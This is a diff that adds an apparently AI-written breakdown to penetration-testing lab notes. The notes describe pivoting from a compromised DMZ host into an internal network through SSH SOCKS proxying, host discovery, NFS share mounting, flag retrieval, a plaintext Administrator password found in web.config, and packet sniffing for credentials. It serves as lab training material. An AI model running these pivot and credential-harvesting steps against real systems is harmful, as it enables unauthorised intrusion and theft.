@@ -161,3 +161,128 @@ tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 by
 ^C2027 packets captured
 2033 packets received by filter
 0 packets dropped by kernel
+
+
+GPT Breakdown: 
+
+🕵️‍♂️ Internal Enumeration & Pivot Setup – dmz01
+🎯 Goal:
+Leverage root access on dmz01 to pivot into the internal network
+
+Identify accessible internal systems
+
+Retrieve credentials and flags
+
+Begin setting up for lateral movement
+
+🔑 Root Access Recap:
+We previously gained root SSH access to dmz01 using a dumped private key:
+
+bash
+Copy
+Edit
+chmod 600 rootkey
+ssh -i rootkey root@10.129.229.147
+🌐 Proxy Setup for Pivot:
+We set up a dynamic SOCKS5 proxy to route traffic through dmz01:
+
+bash
+Copy
+Edit
+ssh -D 9050 -i rootkey root@10.129.229.147
+Proxychains tip: Always use socks5 in /etc/proxychains.conf.
+
+🔍 Host Discovery in 172.16.8.0/24:
+bash
+Copy
+Edit
+for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
+Save the responding IPs to IL_hosts.
+
+🚀 Bypassing Nmap Proxy Issues:
+Proxychains often breaks with nmap, so we used a static binary:
+
+Download from: Andrew-D Static Binaries
+
+Transfer it to the target:
+
+bash
+Copy
+Edit
+scp -i rootkey nmap root@10.129.229.147:/root
+Then scan the internal targets from dmz01:
+
+bash
+Copy
+Edit
+./nmap -sT -iL IL_hosts
+🔎 Key Hosts Discovered:
+🧠 Likely Domain Controller – 172.16.8.3
+makefile
+Copy
+Edit
+Ports: 53, 88, 135, 139, 389, 445, 464, 593, 636
+💾 Fileshare/Dev System – 172.16.8.20
+yaml
+Copy
+Edit
+Ports: 80, 111, 135, 139, 445, 2049 (NFS), 3389
+🌐 Web System – 172.16.8.50
+yaml
+Copy
+Edit
+Ports: 135, 139, 445, 3389, 8080
+💻 Mail/Web – 172.16.8.120
+yaml
+Copy
+Edit
+Ports: 21, 22, 25, 53, 80, 110, 111, 143, 993, 995, 8080
+📁 NFS Enumeration & Flag Retrieval:
+Enumerated exported shares via host machine:
+
+bash
+Copy
+Edit
+proxychains showmount -e 172.16.8.20
+# Output: /DEV01 (everyone)
+On dmz01, mounted the share:
+
+bash
+Copy
+Edit
+mkdir /tmp/DEV01
+mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
+cd /tmp/DEV01
+Retrieved flag:
+
+bash
+Copy
+Edit
+cat flag.txt
+# Flag: bf22a1d0acfca4af517e1417a80e92d1
+🔐 Discovered Credentials:
+Within /tmp/DEV01/DNN/web.config:
+
+xml
+Copy
+Edit
+<username>Administrator</username>
+<value>D0tn31Nuk3R0ck$$@123</value>
+Credentials Found: Administrator:D0tn31Nuk3R0ck$$@123
+
+🕵️‍♂️ Passive Network Monitoring:
+Captured internal traffic using:
+
+bash
+Copy
+Edit
+tcpdump -i ens192 -s 65535 -w ilfreight_pcap
+Captured 2027 packets. Useful for sniffing plaintext creds or gathering internal service insights.
+
+🔁 Notes:
+Enum4linux-ng against the DC (172.16.8.3) returned no results
+
+Proxychains + showmount worked great for NFS enum
+
+Mounted share was world-readable – poor misconfiguration
+
